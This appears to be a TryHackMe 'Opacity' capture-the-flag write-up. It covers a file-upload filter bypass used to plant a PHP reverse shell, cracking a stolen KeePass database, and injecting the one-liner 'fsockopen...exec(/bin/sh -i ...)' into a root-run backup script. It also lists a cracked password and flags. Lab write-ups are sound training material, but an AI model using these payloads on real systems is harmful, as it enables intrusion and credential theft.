@@ -1,0 +1,357 @@
+https://medium.com/p/57edf36138d2
+
+C:\Users\Bobby\Documents\Obsidian Vault\CTFs\TryHackMe\Opacity.md
+
+![[Screenshot 2025-01-18 224958.webp]]
+
+Run nmap to see what services are running
+
+`└─$ nmap -sC 10.10.104.194`
+`Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-18 22:53 EST`
+`Nmap scan report for 10.10.104.194`
+`Host is up (0.12s latency).`
+`Not shown: 996 closed tcp ports (reset)`
+`PORT    STATE SERVICE`
+`22/tcp  open  ssh`
+`| ssh-hostkey:` 
+`|   3072 0f:ee:29:10:d9:8e:8c:53:e6:4d:e3:67:0c:6e:be:e3 (RSA)`
+`|   256 95:42:cd:fc:71:27:99:39:2d:00:49:ad:1b:e4:cf:0e (ECDSA)`
+`|_  256 ed:fe:9c:94:ca:9c:08:6f:f2:5c:a6:cf:4d:3c:8e:5b (ED25519)`
+`80/tcp  open  http`
+`| http-cookie-flags:` 
+`|   /:` 
+`|     PHPSESSID:` 
+`|_      httponly flag not set`
+`| http-title: Login`
+`|_Requested resource was login.php`
+`139/tcp open  netbios-ssn`
+`445/tcp open  microsoft-ds`
+
+`Host script results:`
+`|_nbstat: NetBIOS name: OPACITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)`
+`| smb2-time:` 
+`|   date: 2025-01-19T03:53:52`
+`|_  start_date: N/A`
+`| smb2-security-mode:` 
+`|   3:1:1:` 
+`|_    Message signing enabled but not required`
+
+HTTP sever. Shows a login page. Run gobuster to find additional directories. 
+
+```
+┌──(kali㉿kali)-[~]
+└─$ gobuster dir -u http://10.201.4.147/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.201.4.147/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/css                  (Status: 301) [Size: 310] [--> http://10.201.4.147/css/]
+/cloud                (Status: 301) [Size: 312] [--> http://10.201.4.147/cloud/]
+Progress: 141708 / 141709 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+```
+
+/cloud lets us upload images and view them. If we can upload a php reverse shell, we can get a foothold. However, it only lets you upload images that end with .jpg or .png.
+
+We can get around this by naming our file shell.php#.png
+
+```
+┌──(kali㉿kali)-[~]
+└─$ locate php-reverse
+/home/kali/php-reverse-shell-1.0
+/home/kali/Downloads/php-reverse-shell-1.0
+/home/kali/Downloads/php-reverse-shell-1.0.tar.gz
+/home/kali/Downloads/php-reverse-shell-1.0/CHANGELOG
+/home/kali/Downloads/php-reverse-shell-1.0/COPYING.GPL
+/home/kali/Downloads/php-reverse-shell-1.0/COPYING.PHP-REVERSE-SHELL
+/home/kali/Downloads/php-reverse-shell-1.0/php-reverse-shell.php
+/home/kali/Downloads/shell/php-reverse-shell-1.0
+/home/kali/Downloads/shell/php-reverse-shell-1.0/CHANGELOG
+/home/kali/Downloads/shell/php-reverse-shell-1.0/COPYING.GPL
+/home/kali/Downloads/shell/php-reverse-shell-1.0/COPYING.PHP-REVERSE-SHELL
+/home/kali/Downloads/shell/php-reverse-shell-1.0/exploit.png.php
+/home/kali/Downloads/shell/php-reverse-shell-1.0/php-reverse-shell.php
+/home/kali/php-reverse-shell-1.0/CHANGELOG
+/home/kali/php-reverse-shell-1.0/COPYING.GPL
+/home/kali/php-reverse-shell-1.0/COPYING.PHP-REVERSE-SHELL
+/home/kali/php-reverse-shell-1.0/php-reverse-shell.php
+/home/kali/php-reverse-shell-1.0/rev.php%0a.png
+/usr/share/laudanum/php/php-reverse-shell.php
+/usr/share/laudanum/wordpress/templates/php-reverse-shell.php
+/usr/share/seclists/Web-Shells/laudanum-1.0/php/php-reverse-shell.php
+/usr/share/seclists/Web-Shells/laudanum-1.0/wordpress/templates/php-reverse-shell.php
+/usr/share/webshells/php/php-reverse-shell.php
+                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ cp /usr/share/webshells/php/php-reverse-shell.php shell.php#.png
+                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ mousepad shell.php#.png      
+```
+
+Edit the shell with your public IP.
+![[Screenshot 2025-10-03 230210.webp]]
+
+
+Start an HTTP server so the "/cloud" server can get the image.
+```
+┌──(kali㉿kali)-[~]
+└─$ python3 -m http.server                          
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+Start listening for the reverse shell
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 1234             
+listening on [any] 1234 ...
+```
+
+Enter in your URL, the port of your HTTP server, and the filename.
+![[Screenshot 2025-10-03 230527.webp]]
+
+
+The "/cloud" server GETS the image from your HTTP server
+```
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.201.4.147 - - [03/Oct/2025 23:12:34] "GET //shell.php HTTP/1.1" 200 -
+```
+
+The reverse shell has been established
+```
+listening on [any] 1234 ...
+connect to [10.6.13.137] from (UNKNOWN) [10.201.4.147] 53108
+Linux ip-10-201-4-147 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+ 03:12:36 up 41 min,  0 users,  load average: 0.02, 0.01, 0.04
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+
+```
+
+Explore the directories
+```
+$ ls
+bin
+boot
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+swap.img
+sys
+tmp
+usr
+var
+```
+
+```
+$ whoami
+www-data
+$ 
+```
+
+KDBX is the file format for the password database used by KeePass and other KeePass-compatible password managers.
+```
+$ cd opt
+$ ls 
+dataset.kdbx 
+```
+
+In the opt folder of the machine with the reverse shell, start an http server
+```
+$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.6.13.137 - - [04/Oct/2025 02:56:29] "GET /dataset.kdbx HTTP/1.1" 200 -
+```
+
+On your machine, get the dataset.kdbx from the target
+```
+┌──(kali㉿kali)-[~]
+└─$ wget http://$IP:8000/dataset.kdbx
+--2025-10-03 22:56:30--  http://10.201.4.147:8000/dataset.kdbx
+Connecting to 10.201.4.147:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1566 (1.5K) [application/octet-stream]
+Saving to: ‘dataset.kdbx’
+
+dataset.kdbx                     100%[========================================================>]   1.53K  --.-KB/s    in 0s      
+
+2025-10-03 22:56:30 (211 MB/s) - ‘dataset.kdbx’ saved [1566/1566]
+
+```
+
+Install keepassxc to open the file, but first you need to unlock it.
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo apt install keepassxc-full  
+```
+
+
+Convert it so john can crack it.
+```
+┌──(kali㉿kali)-[~]
+└─$ keepass2john dataset.kdbx > dataset.hash
+                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ john dataset.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 100000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
+Will run 4 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+741852963        (dataset)     
+1g 0:00:00:16 DONE 2/3 (2025-10-03 23:10) 0.06119g/s 201.4p/s 201.4c/s 201.4C/s rosita..loveu
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                          
+```
+
+The password is 741852963
+
+![[Screenshot 2025-10-03 232354.webp]]
+
+Username and password for sysadmin
+Cl0udP4ss40p4city#8700
+
+SSH into the sysadmin account
+```
+┌──(kali㉿kali)-[~]
+└─$ ssh sysadmin@10.201.4.147
+```
+
+Get the first flag
+```
+sysadmin@ip-10-201-4-147:~$ cat local.txt
+6661b61b44d234d230d06bf5b3c075e2
+sysadmin@ip-10-201-4-147:~$ 
+
+```
+
+Check out script.php
+```
+sysadmin@ip-10-201-4-147:~$ ls
+local.txt  scripts
+sysadmin@ip-10-201-4-147:~$ cd scripts/
+sysadmin@ip-10-201-4-147:~/scripts$ cat script.php 
+<?php
+
+//Backup of scripts sysadmin folder
+require_once('lib/backup.inc.php');
+zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
+echo 'Successful', PHP_EOL;
+
+//Files scheduled removal
+$dir = "/var/www/html/cloud/images";
+if(file_exists($dir)){
+    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
+    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
+    foreach ( $ri as $file ) {
+        $file->isDir() ?  rmdir($file) : unlink($file);
+    }
+}
+?>
+
+```
+
+The script performs regular backups by executing the lib/backup.inc.php file. This file executes as root. Edit it to include a reverse shell with root access.
+
+```
+nano backup.inc.php
+```
+
+Add a reverse shell to the backup.inc.php
+
+$sock=fsockopen("<your_ip_address>",1234);exec("/bin/sh -i <&3 >&3 2>&3");
+
+```
+<?php
+
+$sock=fsockopen("<your_ip_address>",1234);exec("/bin/sh -i <&3 >&3 2>&3");
+
+ini_set('max_execution_time', 600);
+ini_set('memory_limit', '1024M');
+
+
+function zipData($source, $destination) {
+        if (extension_loaded('zip')) {
+                if (file_exists($source)) {
+                        $zip = new ZipArchive();
+                        if ($zip->open($destination, ZIPARCHIVE::CREATE)) {
+                                $source = realpath($source);
+                                if (is_dir($source)) {
+                                        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
+                                        foreach ($files as $file) {
+                                                $file = realpath($file);
+                                                if (is_dir($file)) {
+                                                        $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
+                                                } else if (is_file($file)) {
+                                                        $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
+                                                }
+                                        }
+                                } else if (is_file($source)) {
+                                        $zip->addFromString(basename($source), file_get_contents($source));
+                                }
+                        }
+                        return $zip->close();
+                }
+        }
+        return false;
+}
+?>
+```
+
+Wait a couple minutes for the script to run
+```
+$nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.6.13.137] from (UNKNOWN) [10.201.4.147] 32792
+/bin/sh: 0: can't access tty; job control turned off
+# 
+```
+
+We have root, get the flag.
+```
+# whoami
+root
+# pwd
+/root
+# ls
+proof.txt
+snap
+# cat proof.txt
+ac0d56f93202dd57dcb2498c739fd20e
+```
